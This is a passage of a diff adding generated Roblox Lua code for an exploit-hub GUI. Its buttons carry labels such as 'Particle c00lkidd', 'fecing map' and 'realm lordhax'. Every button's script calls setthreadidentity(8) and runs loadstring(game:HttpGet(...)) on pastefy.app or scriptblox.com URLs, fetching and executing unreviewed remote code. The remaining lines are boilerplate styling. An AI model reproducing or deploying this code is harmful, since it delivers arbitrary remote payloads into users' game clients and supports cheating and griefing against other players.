+HTT03["TextButton_53"].Rotation = 0
+HTT03["TextButton_53"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_53"].BackgroundTransparency = 0
+HTT03["TextButton_53"].BorderSizePixel = 3
+HTT03["TextButton_53"].BorderColor3 = Color3.fromRGB(4,0,255)
+HTT03["TextButton_53"].ClipsDescendants = false
+HTT03["TextButton_53"].Active = true
+HTT03["TextButton_53"].Selectable = true
+HTT03["TextButton_53"].AutoButtonColor = true
+HTT03["TextButton_53"].Modal = false
+HTT03["TextButton_53"].Text = "Particle c00lkidd"
+HTT03["TextButton_53"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_53"].TextSize = 10
+HTT03["TextButton_53"].TextTransparency = 0
+HTT03["TextButton_53"].TextScaled = false
+HTT03["TextButton_53"].TextWrapped = false
+HTT03["TextButton_53"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_53"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_53"].Font = Enum.Font.Legacy
+HTT03["TextButton_53"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_53"].TextStrokeTransparency = 1
+HTT03["TextButton_53"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_54"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_53"])
+HTT03["UIAspectRatioConstraint_54"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_55"] = Instance.new("LocalScript")
+HTT03["LocalScript_55"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_55"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGetAsync("https://pastefy.app/XQnIE6FS/raw"))()
+end)]==]
+    end)
+    HTT03["LocalScript_55"].Parent = HTT03["TextButton_53"]
+    if HTT03["LocalScript_55"]:IsA("BaseScript") then HTT03["LocalScript_55"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGetAsync("https://pastefy.app/XQnIE6FS/raw"))()
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGetAsync("https://pastefy.app/XQnIE6FS/raw"))()
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_55"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_56"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_56"].Name = "TextButton"
+HTT03["TextButton_56"].Visible = true
+HTT03["TextButton_56"].ZIndex = 1
+HTT03["TextButton_56"].LayoutOrder = 0
+HTT03["TextButton_56"].Position = UDim2.new(0.000000,192,0.000000,366)
+HTT03["TextButton_56"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_56"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_56"].Rotation = 0
+HTT03["TextButton_56"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_56"].BackgroundTransparency = 0
+HTT03["TextButton_56"].BorderSizePixel = 3
+HTT03["TextButton_56"].BorderColor3 = Color3.fromRGB(57,0,255)
+HTT03["TextButton_56"].ClipsDescendants = false
+HTT03["TextButton_56"].Active = true
+HTT03["TextButton_56"].Selectable = true
+HTT03["TextButton_56"].AutoButtonColor = true
+HTT03["TextButton_56"].Modal = false
+HTT03["TextButton_56"].Text = "fecing map"
+HTT03["TextButton_56"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_56"].TextSize = 10
+HTT03["TextButton_56"].TextTransparency = 0
+HTT03["TextButton_56"].TextScaled = false
+HTT03["TextButton_56"].TextWrapped = false
+HTT03["TextButton_56"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_56"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_56"].Font = Enum.Font.Legacy
+HTT03["TextButton_56"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_56"].TextStrokeTransparency = 1
+HTT03["TextButton_56"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_57"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_56"])
+HTT03["UIAspectRatioConstraint_57"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_58"] = Instance.new("LocalScript")
+HTT03["LocalScript_58"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_58"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGetAsync("https://pastefy.app/KvYLt6BE/raw"))()
+end)]==]
+    end)
+    HTT03["LocalScript_58"].Parent = HTT03["TextButton_56"]
+    if HTT03["LocalScript_58"]:IsA("BaseScript") then HTT03["LocalScript_58"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGetAsync("https://pastefy.app/KvYLt6BE/raw"))()
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGetAsync("https://pastefy.app/KvYLt6BE/raw"))()
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_58"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_59"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_59"].Name = "TextButton"
+HTT03["TextButton_59"].Visible = true
+HTT03["TextButton_59"].ZIndex = 1
+HTT03["TextButton_59"].LayoutOrder = 0
+HTT03["TextButton_59"].Position = UDim2.new(0.000000,364,0.000000,366)
+HTT03["TextButton_59"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_59"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_59"].Rotation = 0
+HTT03["TextButton_59"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_59"].BackgroundTransparency = 0
+HTT03["TextButton_59"].BorderSizePixel = 3
+HTT03["TextButton_59"].BorderColor3 = Color3.fromRGB(0,8,255)
+HTT03["TextButton_59"].ClipsDescendants = false
+HTT03["TextButton_59"].Active = true
+HTT03["TextButton_59"].Selectable = true
+HTT03["TextButton_59"].AutoButtonColor = true
+HTT03["TextButton_59"].Modal = false
+HTT03["TextButton_59"].Text = "Elv4 GUI Ultimate"
+HTT03["TextButton_59"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_59"].TextSize = 10
+HTT03["TextButton_59"].TextTransparency = 0
+HTT03["TextButton_59"].TextScaled = false
+HTT03["TextButton_59"].TextWrapped = false
+HTT03["TextButton_59"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_59"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_59"].Font = Enum.Font.Legacy
+HTT03["TextButton_59"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_59"].TextStrokeTransparency = 1
+HTT03["TextButton_59"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_60"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_59"])
+HTT03["UIAspectRatioConstraint_60"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_61"] = Instance.new("LocalScript")
+HTT03["LocalScript_61"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_61"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-elv4gui-ultimate-ver-1.9-231617"))()
+end)]==]
+    end)
+    HTT03["LocalScript_61"].Parent = HTT03["TextButton_59"]
+    if HTT03["LocalScript_61"]:IsA("BaseScript") then HTT03["LocalScript_61"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-elv4gui-ultimate-ver-1.9-231617"))()
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-elv4gui-ultimate-ver-1.9-231617"))()
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_61"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_62"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_62"].Name = "TextButton"
+HTT03["TextButton_62"].Visible = true
+HTT03["TextButton_62"].ZIndex = 1
+HTT03["TextButton_62"].LayoutOrder = 0
+HTT03["TextButton_62"].Position = UDim2.new(0.000000,22,0.000000,452)
+HTT03["TextButton_62"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_62"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_62"].Rotation = 0
+HTT03["TextButton_62"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_62"].BackgroundTransparency = 0
+HTT03["TextButton_62"].BorderSizePixel = 3
+HTT03["TextButton_62"].BorderColor3 = Color3.fromRGB(4,0,255)
+HTT03["TextButton_62"].ClipsDescendants = false
+HTT03["TextButton_62"].Active = true
+HTT03["TextButton_62"].Selectable = true
+HTT03["TextButton_62"].AutoButtonColor = true
+HTT03["TextButton_62"].Modal = false
+HTT03["TextButton_62"].Text = "rain obama"
+HTT03["TextButton_62"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_62"].TextSize = 10
+HTT03["TextButton_62"].TextTransparency = 0
+HTT03["TextButton_62"].TextScaled = false
+HTT03["TextButton_62"].TextWrapped = false
+HTT03["TextButton_62"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_62"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_62"].Font = Enum.Font.Legacy
+HTT03["TextButton_62"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_62"].TextStrokeTransparency = 1
+HTT03["TextButton_62"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_63"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_62"])
+HTT03["UIAspectRatioConstraint_63"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_64"] = Instance.new("LocalScript")
+HTT03["LocalScript_64"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_64"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/rXTlcpDb/raw"))()
+end)]==]
+    end)
+    HTT03["LocalScript_64"].Parent = HTT03["TextButton_62"]
+    if HTT03["LocalScript_64"]:IsA("BaseScript") then HTT03["LocalScript_64"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/rXTlcpDb/raw"))()
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/rXTlcpDb/raw"))()
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_64"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_65"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_65"].Name = "TextButton"
+HTT03["TextButton_65"].Visible = true
+HTT03["TextButton_65"].ZIndex = 1
+HTT03["TextButton_65"].LayoutOrder = 0
+HTT03["TextButton_65"].Position = UDim2.new(0.000000,194,0.000000,452)
+HTT03["TextButton_65"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_65"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_65"].Rotation = 0
+HTT03["TextButton_65"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_65"].BackgroundTransparency = 0
+HTT03["TextButton_65"].BorderSizePixel = 3
+HTT03["TextButton_65"].BorderColor3 = Color3.fromRGB(0,8,255)
+HTT03["TextButton_65"].ClipsDescendants = false
+HTT03["TextButton_65"].Active = true
+HTT03["TextButton_65"].Selectable = true
+HTT03["TextButton_65"].AutoButtonColor = true
+HTT03["TextButton_65"].Modal = false
+HTT03["TextButton_65"].Text = "Chicken Arms"
+HTT03["TextButton_65"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_65"].TextSize = 10
+HTT03["TextButton_65"].TextTransparency = 0
+HTT03["TextButton_65"].TextScaled = false
+HTT03["TextButton_65"].TextWrapped = false
+HTT03["TextButton_65"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_65"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_65"].Font = Enum.Font.Legacy
+HTT03["TextButton_65"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_65"].TextStrokeTransparency = 1
+HTT03["TextButton_65"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_66"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_65"])
+HTT03["UIAspectRatioConstraint_66"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_67"] = Instance.new("LocalScript")
+HTT03["LocalScript_67"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_67"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/XdxuBkOJ/raw"))()
+end)]==]
+    end)
+    HTT03["LocalScript_67"].Parent = HTT03["TextButton_65"]
+    if HTT03["LocalScript_67"]:IsA("BaseScript") then HTT03["LocalScript_67"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/XdxuBkOJ/raw"))()
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/XdxuBkOJ/raw"))()
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_67"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_68"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_68"].Name = "TextButton"
+HTT03["TextButton_68"].Visible = true
+HTT03["TextButton_68"].ZIndex = 1
+HTT03["TextButton_68"].LayoutOrder = 0
+HTT03["TextButton_68"].Position = UDim2.new(0.000000,364,0.000000,453)
+HTT03["TextButton_68"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_68"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_68"].Rotation = 0
+HTT03["TextButton_68"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_68"].BackgroundTransparency = 0
+HTT03["TextButton_68"].BorderSizePixel = 3
+HTT03["TextButton_68"].BorderColor3 = Color3.fromRGB(0,35,255)
+HTT03["TextButton_68"].ClipsDescendants = false
+HTT03["TextButton_68"].Active = true
+HTT03["TextButton_68"].Selectable = true
+HTT03["TextButton_68"].AutoButtonColor = true
+HTT03["TextButton_68"].Modal = false
+HTT03["TextButton_68"].Text = "Head Shake"
+HTT03["TextButton_68"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_68"].TextSize = 10
+HTT03["TextButton_68"].TextTransparency = 0
+HTT03["TextButton_68"].TextScaled = false
+HTT03["TextButton_68"].TextWrapped = false
+HTT03["TextButton_68"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_68"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_68"].Font = Enum.Font.Legacy
+HTT03["TextButton_68"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_68"].TextStrokeTransparency = 1
+HTT03["TextButton_68"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_69"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_68"])
+HTT03["UIAspectRatioConstraint_69"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_70"] = Instance.new("LocalScript")
+HTT03["LocalScript_70"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_70"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/4iEuU8oR/raw"))()
+end)]==]
+    end)
+    HTT03["LocalScript_70"].Parent = HTT03["TextButton_68"]
+    if HTT03["LocalScript_70"]:IsA("BaseScript") then HTT03["LocalScript_70"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/4iEuU8oR/raw"))()
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/4iEuU8oR/raw"))()
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_70"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_71"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_71"].Name = "TextButton"
+HTT03["TextButton_71"].Visible = true
+HTT03["TextButton_71"].ZIndex = 1
+HTT03["TextButton_71"].LayoutOrder = 0
+HTT03["TextButton_71"].Position = UDim2.new(0.000000,365,0.000000,544)
+HTT03["TextButton_71"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_71"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_71"].Rotation = 0
+HTT03["TextButton_71"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_71"].BackgroundTransparency = 0
+HTT03["TextButton_71"].BorderSizePixel = 3
+HTT03["TextButton_71"].BorderColor3 = Color3.fromRGB(0,4,255)
+HTT03["TextButton_71"].ClipsDescendants = false
+HTT03["TextButton_71"].Active = true
+HTT03["TextButton_71"].Selectable = true
+HTT03["TextButton_71"].AutoButtonColor = true
+HTT03["TextButton_71"].Modal = false
+HTT03["TextButton_71"].Text = "cZergui"
+HTT03["TextButton_71"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_71"].TextSize = 10
+HTT03["TextButton_71"].TextTransparency = 0
+HTT03["TextButton_71"].TextScaled = false
+HTT03["TextButton_71"].TextWrapped = false
+HTT03["TextButton_71"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_71"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_71"].Font = Enum.Font.Legacy
+HTT03["TextButton_71"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_71"].TextStrokeTransparency = 1
+HTT03["TextButton_71"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_72"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_71"])
+HTT03["UIAspectRatioConstraint_72"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_73"] = Instance.new("LocalScript")
+HTT03["LocalScript_73"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_73"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-cZergui-32-237221"))()
+end)]==]
+    end)
+    HTT03["LocalScript_73"].Parent = HTT03["TextButton_71"]
+    if HTT03["LocalScript_73"]:IsA("BaseScript") then HTT03["LocalScript_73"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-cZergui-32-237221"))()
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-cZergui-32-237221"))()
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_73"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextButton "TextButton"
+HTT03["TextButton_74"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_74"].Name = "TextButton"
+HTT03["TextButton_74"].Visible = true
+HTT03["TextButton_74"].ZIndex = 1
+HTT03["TextButton_74"].LayoutOrder = 0
+HTT03["TextButton_74"].Position = UDim2.new(0.000000,24,0.000000,544)
+HTT03["TextButton_74"].Size = UDim2.new(0.000000,162,0.000000,44)
+HTT03["TextButton_74"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_74"].Rotation = 0
+HTT03["TextButton_74"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_74"].BackgroundTransparency = 0
+HTT03["TextButton_74"].BorderSizePixel = 3
+HTT03["TextButton_74"].BorderColor3 = Color3.fromRGB(3,0,255)
+HTT03["TextButton_74"].ClipsDescendants = false
+HTT03["TextButton_74"].Active = true
+HTT03["TextButton_74"].Selectable = true
+HTT03["TextButton_74"].AutoButtonColor = true
+HTT03["TextButton_74"].Modal = false
+HTT03["TextButton_74"].Text = "realm lordhax"
+HTT03["TextButton_74"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_74"].TextSize = 10
+HTT03["TextButton_74"].TextTransparency = 0
+HTT03["TextButton_74"].TextScaled = false
+HTT03["TextButton_74"].TextWrapped = false
+HTT03["TextButton_74"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_74"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_74"].Font = Enum.Font.Legacy
+HTT03["TextButton_74"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_74"].TextStrokeTransparency = 1
+HTT03["TextButton_74"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_75"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_74"])
+HTT03["UIAspectRatioConstraint_75"].AspectRatio = 3.681818
+-- LocalScript "LocalScript"
+HTT03["LocalScript_76"] = Instance.new("LocalScript")
+HTT03["LocalScript_76"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_76"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/54SFcnpX/raw"))()
+end)]==]
+    end)
+    HTT03["LocalScript_76"].Parent = HTT03["TextButton_74"]
+    if HTT03["LocalScript_76"]:IsA("BaseScript") then HTT03["LocalScript_76"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/54SFcnpX/raw"))()
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/54SFcnpX/raw"))()
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_76"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- UIGradient "UIGradientRainbow"
+HTT03["UIGradient_77"] = Instance.new("UIGradient", HTT03["TextButton_74"])
+HTT03["UIGradient_77"].Name = "UIGradientRainbow"
+HTT03["UIGradient_77"].Enabled = true
+HTT03["UIGradient_77"].Rotation = 45
+HTT03["UIGradient_77"].Offset = Vector2.new(0.000000,0.000000)
+HTT03["UIGradient_77"].Color = ColorSequence.new(Color3.fromRGB(0,146,255), Color3.fromRGB(0,146,255))
+do
+    local _f = HTT03["UIGradient_77"]
+    local _g = _f:IsA("UIGradient") and _f or _f:FindFirstChildOfClass("UIGradient")
+    if _g then
+        local _o = 0
+        table.insert(_rbFuncs, function(dt)
+            if not _g or not _g.Parent then return end
+            _o = (_o + dt * 0.3) % 1
+            local k = {}
+            for i = 0, 7 do local t = i / 7; table.insert(k, ColorSequenceKeypoint.new(t, Color3.fromHSV((t + _o) % 1, 1, 1))) end
+            _g.Color = ColorSequence.new(k)
+        end)
+    end
+end
+-- TextButton "TextButton"
+HTT03["TextButton_78"] = Instance.new("TextButton", HTT03["ScrollingFrame_15"])
+HTT03["TextButton_78"].Name = "TextButton"
+HTT03["TextButton_78"].Visible = true
+HTT03["TextButton_78"].ZIndex = 1
+HTT03["TextButton_78"].LayoutOrder = 0
+HTT03["TextButton_78"].Position = UDim2.new(0.000000,198,0.000000,544)
+HTT03["TextButton_78"].Size = UDim2.new(0.000000,122,0.000000,44)
+HTT03["TextButton_78"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextButton_78"].Rotation = 0
+HTT03["TextButton_78"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_78"].BackgroundTransparency = 0
+HTT03["TextButton_78"].BorderSizePixel = 3
+HTT03["TextButton_78"].BorderColor3 = Color3.fromRGB(22,0,255)
+HTT03["TextButton_78"].ClipsDescendants = false
+HTT03["TextButton_78"].Active = true
+HTT03["TextButton_78"].Selectable = true
+HTT03["TextButton_78"].AutoButtonColor = true
+HTT03["TextButton_78"].Modal = false
+HTT03["TextButton_78"].Text = "face f3x"
+HTT03["TextButton_78"].TextColor3 = Color3.fromRGB(255,255,255)
+HTT03["TextButton_78"].TextSize = 10
+HTT03["TextButton_78"].TextTransparency = 0
+HTT03["TextButton_78"].TextScaled = false
+HTT03["TextButton_78"].TextWrapped = false
+HTT03["TextButton_78"].TextXAlignment = Enum.TextXAlignment.Center
+HTT03["TextButton_78"].TextYAlignment = Enum.TextYAlignment.Center
+HTT03["TextButton_78"].Font = Enum.Font.Legacy
+HTT03["TextButton_78"].TextStrokeColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextButton_78"].TextStrokeTransparency = 1
+HTT03["TextButton_78"].RichText = false
+-- Auto constraint "TextButton"
+HTT03["UIAspectRatioConstraint_79"] = Instance.new("UIAspectRatioConstraint", HTT03["TextButton_78"])
+HTT03["UIAspectRatioConstraint_79"].AspectRatio = 2.772727
+-- LocalScript "LocalScript"
+HTT03["LocalScript_80"] = Instance.new("LocalScript")
+HTT03["LocalScript_80"].Name = "LocalScript"
+do
+    pcall(function()
+        if setthreadidentity then setthreadidentity(8) end
+        HTT03["LocalScript_80"].Source = [==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/U58a6sf3/raw"))()
+end)]==]
+    end)
+    HTT03["LocalScript_80"].Parent = HTT03["TextButton_78"]
+    if HTT03["LocalScript_80"]:IsA("BaseScript") then HTT03["LocalScript_80"].Enabled = true end
+    pcall(function()
+        local _gcFn = loadstring and loadstring([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/U58a6sf3/raw"))()
+end)]==]) or load([==[local button = script.Parent
+button.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/U58a6sf3/raw"))()
+end)]==])
+        if _gcFn then
+            local _gcEnv = setmetatable({script = HTT03["LocalScript_80"]}
+                , {__index = getfenv and getfenv() or _G})
+            pcall(function() setfenv(_gcFn, _gcEnv) end)
+            pcall(_gcFn)
+        end
+    end)
+end
+-- TextLabel "TextLabel"
+HTT03["TextLabel_81"] = Instance.new("TextLabel", HTT03["ScrollingFrame_15"])
+HTT03["TextLabel_81"].Name = "TextLabel"
+HTT03["TextLabel_81"].Visible = true
+HTT03["TextLabel_81"].ZIndex = 1
+HTT03["TextLabel_81"].LayoutOrder = 0
+HTT03["TextLabel_81"].Position = UDim2.new(0.000000,153,0.000000,593)
+HTT03["TextLabel_81"].Size = UDim2.new(0.000000,203,0.000000,31)
+HTT03["TextLabel_81"].AnchorPoint = Vector2.new(0.000000,0.000000)
+HTT03["TextLabel_81"].Rotation = 0
+HTT03["TextLabel_81"].BackgroundColor3 = Color3.fromRGB(0,0,0)
+HTT03["TextLabel_81"].BackgroundTransparency = 0
+HTT03["TextLabel_81"].BorderSizePixel = 1
+HTT03["TextLabel_81"].BorderColor3 = Color3.fromRGB(0,0,0)
